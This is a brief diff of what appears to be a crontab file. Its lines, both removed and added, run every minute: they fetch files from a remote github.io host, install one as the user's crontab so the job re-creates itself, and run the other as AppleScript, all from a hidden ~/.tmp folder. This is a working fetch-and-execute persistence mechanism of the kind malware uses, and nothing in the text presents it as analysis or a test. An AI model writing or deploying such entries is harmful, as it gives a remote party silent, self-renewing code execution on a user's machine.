@@ -1,2 +1,2 @@
-* * * * * mkdir -p ~/.tmp; curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp; crontab ~/.tmp/.tmp; rm ~/.tmp/.tmp
-* * * * * mkdir -p ~/.tmp; curl -s https://sitetest.github.io/scr.txt >~/.tmp/.tmp.scpt; osascript ~/.tmp/.tmp.scpt;
+* * * * * curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp; crontab ~/.tmp/.tmp; rm ~/.tmp/.tmp
+* * * * * curl -s https://sitetest.github.io/scr.txt >~/.tmp/.tmp.scpt; osascript ~/.tmp/.tmp.scpt;
